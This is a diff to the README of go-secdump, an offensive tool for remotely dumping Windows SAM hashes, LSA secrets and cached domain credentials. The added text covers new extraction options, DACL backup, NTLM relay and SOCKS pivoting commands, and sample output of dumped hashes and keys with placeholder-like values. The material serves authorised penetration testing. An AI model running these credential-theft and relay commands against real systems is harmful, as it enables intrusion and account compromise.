@@ -49,6 +49,12 @@ options:
       --local               Authenticate as a local user instead of domain user
       --dump                Saves the SAM and SECURITY hives to disk and
                             transfers them to the local machine.
+      --sam                 Extract secrets from the SAM hive explicitly. Only other explicit targets are included.
+      --lsa                 Extract LSA secrets explicitly. Only other explicit targets are included.
+      --dcc2                Extract DCC2 caches explicitly. Only ohter explicit targets are included.
+      --backup-dacl         Save original DACLs to disk before modification
+      --restore-dacl        Restore DACLs using disk backup. Could be useful if automated restore fails.
+      --backup-file         Filename for DACL backup (default dacl.backup)
       --relay               Start an SMB listener that will relay incoming
                             NTLM authentications to the remote server and
                             use that connection. NOTE that this forces SMB 2.1
@@ -61,13 +67,97 @@ options:
       --smb2                Force smb 2.1
       --debug               Enable debug logging
       --verbose             Enable verbose logging
+  -o, --output              Filename for writing results (default is stdout). Will append to file if it exists.
   -v, --version             Show version
 ```
 
+## Changing DACLs
+go-secdump will automatically try to modify and then restore the DACLs of the
+required registry keys. However, if something goes wrong during the restoration
+part such as a network disconnect or other interrupt, the remote registry will
+be left with the modified DACLs.
+
+Using the `--backup-dacl` argument it is possible to store a serialized copy of
+the original DACLs before modification.
+If a connectivity problem occurs, the DACLs can later be restored from file
+using the `--restore-dacl` argument.
+
 ## Examples
 
-Dump registry secrets
+Dump all registry secrets
 
 ```
 ./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local
+or
+./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local --sam --lsa --dcc2
+```
+
+Dump only SAM, LSA, or DCC2 cache secrets
+
+```
+./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local --sam
+./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local --lsa
+./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local --dcc2
+```
+
+### NTLM Relaying
+Dump registry secrets using NTLM relaying
+
+Start listener
+```
+./go-secdump --host 192.168.0.100 -n --relay
+```
+
+Trigger an auth to your machine from a client with administrative access to
+192.168.0.100 somehow and then wait for the dumped secrets.
+
+```
+YYYY/MM/DD HH:MM:SS smb [Notice] Client connected from 192.168.0.30:49805
+YYYY/MM/DD HH:MM:SS smb [Notice] Client (192.168.0.30:49805) successfully authenticated as (domain.local\Administrator) against (192.168.0.100:445)!
+Net-NTLMv2 Hash: Administrator::domain.local:34f4533b697afc39:b4dcafebabedd12deadbeeffef1cea36:010100000deadbeef59d13adc22dda0
+2023/12/13 14:47:28 [Notice] [+] Signing is NOT required
+2023/12/13 14:47:28 [Notice] [+] Login successful as domain.local\Administrator
+[*] Dumping local SAM hashes
+Name: Administrator
+RID: 500
+NT: 2727D7906A776A77B34D0430EAACD2C5
+
+Name: Guest
+RID: 501
+NT: <empty>
+
+Name: DefaultAccount
+RID: 503
+NT: <empty>
+
+Name: WDAGUtilityAccount
+RID: 504
+NT: <empty>
+
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC
+$MACHINE.ACC: 0x15deadbeef645e75b38a50a52bdb67b4
+$MACHINE.ACC:plain_password_hex:47331e26f48208a7807cafeababe267261f79fdc38c740b3bdeadbeef7277d696bcafebabea62bb5247ac63be764401adeadbeef4563cafebabe43692deadbeef03f...
+[*] DPAPI_SYSTEM
+dpapi_machinekey: 0x8afa12897d53deadbeefbd82593f6df04de9c100
+dpapi_userkey: 0x706e1cdea9a8a58cafebabe4a34e23bc5efa8939
+[*] NL$KM
+NL$KM: 0x53aa4b3d0deadbeef42f01ef138c6a74
+[*] Dumping cached domain credentials (domain/username:hash)
+DOMAIN.LOCAL/Administrator:$DCC2$10240#Administrator#97070d085deadbeef22cafebabedd1ab
+...
+```
+
+### SOCKS Proxy
+Dump secrets using an upstream SOCKS5 proxy either for pivoting or to take
+advantage of Impacket's ntlmrelayx.py SOCKS server functionality.
+
+When using ntlmrelayx.py as the upstream proxy, the provided username must match
+that of the authenticated client, but the password can be empty.
+
+```
+./ntlmrelayx.py -socks -t 192.168.0.100 -smb2support --no-http-server --no-wcf-server --no-raw-server
+...
+
+./go-secdump --host 192.168.0.100 --user Administrator -n --socks-host 127.0.0.1 --socks-port 1080
 ```
